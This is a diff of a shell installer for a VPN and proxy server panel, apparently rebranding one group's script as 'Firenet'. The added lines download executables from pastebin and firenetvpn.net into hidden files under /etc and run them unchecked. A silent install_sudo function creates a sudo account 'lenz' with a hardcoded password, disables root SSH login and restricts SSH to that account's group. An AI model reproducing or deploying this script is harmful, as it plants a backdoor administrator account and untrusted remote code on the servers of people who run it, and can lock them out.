@@ -26,7 +26,7 @@ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D05B5
 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32    
 sudo apt update
 sudo apt install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6
-wget 'https://raw.githubusercontent.com/inboxuserdb/alibabadb/main/ocservsquid' -O /etc/init.d/squid3
+wget 'http://firenetvpn.net/files/ocserv/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
 dos2unix /etc/init.d/squid3
 sudo chmod +x /etc/init.d/squid3
 sudo update-rc.d squid3 defaults
@@ -56,20 +56,20 @@ refresh_pattern ^ftp: 1440 20% 10080
 refresh_pattern ^gopher: 1440 0% 1440
 refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
 refresh_pattern . 0 20% 4320
-visible_hostname Alamin-Proxy
+visible_hostname KobZ-Proxy
 error_directory /usr/share/squid3/errors/English' >> squid.conf
 cd /usr/share/squid3/errors/English
 rm ERR_INVALID_URL
-echo '<!--Alamin--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+echo '<!--KobeKobz--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
 chmod 755 *
 service squid3 restart
 cd /etc || exit
-wget 'https://raw.githubusercontent.com/inboxuserdb/alibabadb/main/socksws' -O /etc/socks.py
+wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
-wget 'https://raw.githubusercontent.com/inboxuserdb/alibabadb/main/monitor' -O /etc/.monitor
-wget 'https://raw.githubusercontent.com/inboxuserdb/alibabadb/main/ws' -O /etc/.ws
-wget 'https://raw.githubusercontent.com/inboxuserdb/alibabadb/main/counter' -O /etc/.counter
+wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/monitor' -O /etc/.monitor
+wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/ws' -O /etc/.ws
+wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/counter' -O /etc/.counter
 chmod +x /etc/.monitor
 chmod +x /etc/.ws
 chmod +x /etc/.counter
@@ -96,7 +96,7 @@ echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
-echo '# Openvpn Configuration by Scbuild Bangladesh :)
+echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
 port PORT_UDP
 proto udp
@@ -143,7 +143,7 @@ verb 3' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
-echo '# Openvpn Configuration by Scbuild Bangladesh :)
+echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
 port PORT_TCP
 proto tcp
@@ -369,7 +369,7 @@ echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
 sysctl -p
 {
 iptables -F
-iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 20000:50000 -j DNAT --to-destination :5666
+iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 10000:50000 -j DNAT --to-destination :5666
 iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j MASQUERADE
 iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
 iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j MASQUERADE
@@ -462,9 +462,9 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@Alaminsc@ | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -484,13 +484,14 @@ echo '{
   "up_mbps": 100,
   "down_mbps": 100,
   "disable_udp": false,
-  "obfs": "scbuild",
+  "obfs": "firenet",
   "auth": {
     "mode": "external",
     "config": {
     "cmd": "./.auth.sh"
     }
   },
+  "prometheus_listen": ":5665",
   "recv_window_conn": 107374182400,
   "recv_window_client": 13421772800
 }
@@ -524,7 +525,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://github.com/inboxuserdb/alibabadb/raw/main/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "http://firenetvpn.net/script/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 } &>/dev/null
 }
@@ -581,7 +582,7 @@ exit 0' >> /etc/rc.local
     sudo systemctl start firenet.service
     
     mkdir -m 777 /root/.web
-echo "Made with love by: Scbuild Developer... " >> /root/.web/index.php
+echo "Made with love by: Firenet Developer... " >> /root/.web/index.php
 
 echo "tcp_port=TCP_PORT
 udp_port=UDP_PORT
